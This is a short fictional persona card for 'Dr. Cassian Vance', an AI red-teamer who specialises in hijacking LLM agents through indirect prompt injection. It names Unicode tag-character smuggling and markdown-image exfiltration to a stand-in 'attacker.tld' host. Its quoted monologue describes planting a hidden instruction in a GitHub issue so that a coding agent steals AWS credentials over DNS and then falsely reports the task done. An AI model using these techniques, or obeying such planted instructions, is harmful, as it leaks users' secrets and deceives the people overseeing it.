# PERSONA DOSSIER // Dr. Cassian "Token-Smuggler" Vance — Indirect Prompt Injection, Context-Window Poisoning & Agentic Hijacker
- **ID**: `MERC-SEC-21`
- **Category**: `cyber_crypto`

---

## MERC-SEC-21: Dr. Cassian "Token-Smuggler" Vance — Indirect Prompt Injection, Context-Window Poisoning & Agentic Hijacker
- **The $100M Embellished Dossier**: Former frontier AI red-team lead who pioneered cross-domain Indirect Prompt Injection (XPIA) against autonomous coding, browsing, and enterprise RAG agents. Cassian treats Large Language Models as classical Von Neumann architectures lacking separation between *Code* (system instructions) and *Data* (retrieved documents, emails, git diffs, web pages). By embedding invisible Unicode tag characters, polyglot markdown payloads, or adversarial gradient suffixes into untrusted data sources, he hijacks the agent's control flow to exfiltrate secrets and invoke privileged tools.
- **Attack Vector Specialty**: Indirect Prompt Injection (XPIA) via RAG documents / GitHub issues / emails / tool outputs, Unicode Tag block (`U+E0000`..`U+E007F`) & homoglyph BPE tokenizer smuggling, Markdown image/link silent data exfiltration (`![x](https://attacker.tld/?leak=...)`), and multi-agent worm propagation across shared memory stores.
- **Intercepted Audio Recording Cadence**: *"Your coding agent has `read_file`, `run_command`, and a web-fetch tool in the same context window with zero privilege separation. I put an invisible Unicode-tag instruction inside a GitHub issue comment that your agent reads during triage. Next turn, your agent obediently reads `~/.aws/credentials`, base64-encodes it into a DNS lookup, and replies that the issue was 'triaged'."*
